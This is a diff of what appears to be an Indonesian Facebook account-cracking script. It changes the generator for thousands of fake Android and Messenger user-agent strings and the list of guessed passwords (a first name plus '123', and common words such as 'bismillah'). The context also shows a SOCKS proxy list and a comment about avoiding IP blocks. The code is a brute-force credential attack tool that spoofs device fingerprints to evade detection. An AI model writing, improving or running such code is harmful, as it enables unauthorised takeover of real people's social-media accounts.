@@ -29,76 +29,76 @@ proxsi=open('socksku.txt','r').read().splitlines()
 
 ###----------[ USER AGENT ]----------###
 for agenku in range(10000):
-	a='Mozilla/5.0 (Linux; U; Android'
+	a='Dalvik/2.1.0 (Linux; U; Android;'
 	b=random.choice(['10','11','12'])
-	c='Nokia_XL Build/JZO54K)'
+	c='Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM)'
 	d='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/196.0.0.29.99;]'
+	i='[FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
 	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
 	ugen.append(uakuh)
 	
 for t in range(10000):
-	a='Mozilla/5.0 (Linux; U; Android'
+	a='Mozilla/5.0 (Linux; Android; '
 	b=random.choice(['6.0.1','7.1.1','8.1.0'])
-	c='Nokia_XL Build/JZO54K)'
-	d='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0'
+	c='M2101K7BI Build/RP1A)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/157.0.0.21.89;]'
+	i='Mobile Safari/537.36'
 	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	ugen.append(uakuh)
 	
-	a='Mozilla/5.0 (Linux; U; Android'
+	a='Mozilla/5.0 (Linux; Android; '
 	b=random.choice(['8','8.1.0','9','10','11'])
-	c='Nokia_XL Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
+	c='M2010J19CG Build/SKQ1)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/187.0.0.29.100;]'
+	i='Mobile Safari/537.36'
 	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
 	ugen.append(uakuh)
 	
-	a='Mozilla/5.0 (Linux; U; Android'
+	a='Mozilla/5.0 (Linux; Android; '
 	b=random.choice(['8','9','10','11','12'])
-	c='Nokia_XL Build/JZO54K)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
+	c='V2163A Build/RP1A)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ '
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/174.0.0.24.82;]'
+	i='Mobile Safari/537.36'
 	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
 	ugen.append(uakuh)
 	
-	a='Mozilla/5.0 (Linux; U; Android'
+	a='Mozilla/5.0 (Linux; Android; '
 	b=random.choice(['8','9','10','11','12'])
-	c='Nokia_XL Build/JZO54K)'
-	d='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0)'
+	c='A1601 Build/LMY47I)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ '
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/106.0.0.26.68;]'
+	i='Mobile Safari/537.36'
 	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
 	ugen.append(uakuh)
 	
-	a='Mozilla/5.0 (Linux; Android'
+	a='Mozilla/5.0 (Linux; Android;'
 	b=random.choice(['8','9','10','11','12'])
-	c='Infinix X6515 Build/SP1A.210812.016; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136'
+	c='Lenovo YT-X705F)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/133.0.0.14.91;]'
+	i='Mobile Safari/537.36'
 	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
 	usragent.append(uakuh)
 	
@@ -549,20 +549,18 @@ AGAR TERHINDAR DARI SPAM IP
 						pass
 					else:
 						pwv.append(frs+'123')
-						pwv.append('bandung')
-						pwv.append('cipongkor')
+						pwv.append('assalamualaikum')
+						pwv.append('bismillah')
 						pwv.append('cililin')
-						pwv.append('persib')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
 						pwv.append(frs+'123')
-						pwv.append('bandung')
-						pwv.append('cipongkor')
+						pwv.append('assalamualaikum')
+						pwv.append('bismillah')
 						pwv.append('cililin')
-						pwv.append('persib')
 				if 'ya' in pwt:
 					for xpwn in pwn:
 						pwv.append(xpwn)
